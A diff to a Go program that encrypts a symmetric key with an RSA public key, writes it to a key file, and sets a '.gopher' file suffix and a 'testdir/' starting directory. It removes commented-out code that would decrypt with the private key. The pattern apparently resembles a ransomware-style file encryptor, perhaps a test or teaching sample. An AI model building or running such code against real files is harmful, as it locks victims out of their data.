@@ -97,10 +97,6 @@ func main() {
 	pubPem, _ := pem.Decode(pubRaw)
 	pubKey, _ := x509.ParsePKCS1PublicKey(pubPem.Bytes)
 
-	// privRaw, _ := ioutil.ReadFile("priv.pem")
-	// privPem, _ := pem.Decode(privRaw)
-	// privKey, _ := x509.ParsePKCS1PrivateKey(privPem.Bytes)
-
 	// Encrypt the symmetric key with the asymmetric public key
 	ciphertext, _ := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubKey, append(append(magicBytes, currentTime...), key...), nil)
 
@@ -119,8 +115,6 @@ func main() {
 	keyFile.Close()
 
 	fmt.Printf("Ciphertext: %s\n", hex.EncodeToString(ciphertext))
-	// plaintext, _ := rsa.DecryptOAEP(sha256.New(), rand.Reader, privKey, ciphertext, nil)
-	// fmt.Printf("Plaintext: %s\n", plaintext)
 
 	const suffix = ".gopher"
 	const startingDirectory = "testdir/"
